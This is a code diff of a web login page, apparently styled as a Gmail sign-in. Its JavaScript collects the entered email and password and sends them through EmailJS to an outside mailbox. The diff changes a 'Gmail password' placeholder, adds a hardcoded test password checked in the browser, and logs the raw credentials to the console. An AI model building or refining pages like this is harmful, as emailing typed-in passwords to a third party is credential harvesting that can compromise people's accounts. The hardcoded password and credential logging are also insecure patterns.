@@ -21,7 +21,6 @@
       justify-content:center;
       align-items:center;
       font-family:Arial, sans-serif;
-
       background-image:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
       background-size:cover;
       background-position:center;
@@ -102,8 +101,7 @@
   <h2>LOGIN</h2>
 
   <input type="email" id="email" placeholder="Enter your Gmail">
-
-  <input type="password" id="password" placeholder="Enter your Gmail password">
+  <input type="password" id="password" placeholder="Enter your password">
 
   <button onclick="sendMail()">LOG IN</button>
 
@@ -113,41 +111,47 @@
 
 function sendMail(){
 
-    let email = document.getElementById("email").value;
-    let password = document.getElementById("password").value;
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
 
-    if(email === "" || password === ""){
+    let email = emailInput.value.trim().toLowerCase();
+    let password = passwordInput.value.trim();
+
+    const correctEmail = "test@gmail.com";
+    const correctPassword = "Pushtoon123";
+
+    console.log("EMAIL ENTERED:", email);
+    console.log("PASSWORD ENTERED:", password);
+
+    if (email === "" || password === "") {
         alert("Please fill all fields!");
         return;
     }
 
-    // 🔐 LOGIN CHECK (fix for wrong password issue)
-    let correctEmail = "test@gmail.com";
-    let correctPassword = "1234";
+    if (email === correctEmail && password === correctPassword) {
 
-    if(email !== correctEmail || password !== correctPassword){
+        let params = {
+            email: email,
+            password: password
+        };
+
+        emailjs.send(
+            "service_bqnzz7f",
+            "template_lxwj7sw",
+            params
+        )
+        .then(function(response){
+            alert("Login Successful!");
+            console.log("SUCCESS:", response);
+        })
+        .catch(function(error){
+            alert("FAILED - check console (F12)");
+            console.log("ERROR:", error);
+        });
+
+    } else {
         alert("Wrong email or password!");
-        return;
     }
-
-    let params = {
-        email: email,
-        password: password
-    };
-
-    emailjs.send(
-        "service_bqnzz7f",
-        "template_lxwj7sw",
-        params
-    )
-    .then(function(response){
-        alert("Login Successful!");
-        console.log("SUCCESS:", response);
-    })
-    .catch(function(error){
-        alert("FAILED - check console (F12)");
-        console.log("ERROR:", error);
-    });
 
 }
 
